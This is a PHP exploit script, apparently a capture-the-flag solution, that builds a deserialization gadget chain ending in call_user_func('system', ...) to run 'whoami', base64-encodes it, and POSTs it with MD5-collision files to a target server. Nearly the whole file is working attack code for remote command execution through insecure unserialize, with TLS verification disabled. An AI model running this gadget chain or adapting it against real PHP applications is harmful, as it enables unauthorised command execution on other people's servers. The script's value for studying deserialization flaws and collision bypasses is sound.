<?php
class D0g3
{
    protected $events;
    protected $event;
    function __construct($events, $cmd)
    {
        $this->events = $events;
        $this->event = $cmd;
    }
}
class This
{
    protected $formatters;

    function __construct($function)
    {
        $this->formatters = ['dispatch' => $function];
    }
}
class Gema{
    protected $xbx;
    public function __construct(){
        $this->xbx='system';
    }
    public function patch($Fire){
        call_user_func($this->xbx,$Fire);
    }
}

$a = new This(new Gema());
$b = new D0g3($a,array('whoami',array('whoami')));//exp
$exp=base64_encode(serialize($b));
echo $exp;
// $exp="Tzo0OiJEMGczIjoyOntzOjY6ImV2ZW50cyI7Tzo0OiJUaGlzIjoxOntzOjEwOiJmb3JtYXR0ZXJzIjthOjE6e3M6ODoiZGlzcGF0Y2giO086NDoiR2VtYSI6MTp7czozOiJ4YngiO3M6Njoic3lzdGVtIjt9fX1zOjU6ImV2ZW50IjthOjI6e2k6MDtpOjE7aToxO2E6MTp7aTowO3M6Njoid2hvYW1pIjt9fX0=";

/**
 * 绕过md5的函数
 */
function exp_md5($flag){
    $file1 = "flag_msg1.txt";
    $file2 = "flag_msg2.txt";
    $myfile1 = fopen($file1, "r");
    $myfile2 = fopen($file2, "r");
    if($flag==="a"){
        return (fread($myfile1,filesize($file1)));
    }else if($flag==="b"){
        return (fread($myfile2,filesize($file2)));
    }
}

/**
 * 发送request请求
 * @param $url
 * @param bool $ssl
 * @param string $type
 * @param null $data
 * @return bool|mixed
 */
function Http_request($url, $type, $data = array())
{
    $ssl = true;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    $user_agent = isset($_SERVER['HTTP_USERAGENT']) ? $_SERVER['HTTP_USERAGENT'] : 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36';
    curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);//请求代理信息
    curl_setopt($curl, CURLOPT_AUTOREFERER, true);//referer头 请求来源
    curl_setopt($curl, CURLOPT_TIMEOUT, 30);//请求超时
    curl_setopt($curl, CURLOPT_HEADER, false);//是否处理响应头
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);//curl_exec()是否返回响应
    if ($ssl) {
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);//禁用后curl将终止从服务端进行验证
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);//检查服务器ssl证书中是否存在一个公用名（common name）
    }
    if ($type == "POST") {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    }
    //发出请求
    $response = curl_exec($curl);
    if ($response === false) {
        return false;
    }
    return $response;
}

$url='ip';
$data['data']=$exp;
$data['a']=exp_md5("a");
$data['b']=exp_md5("b");
print(Http_request($url,"POST",$data));
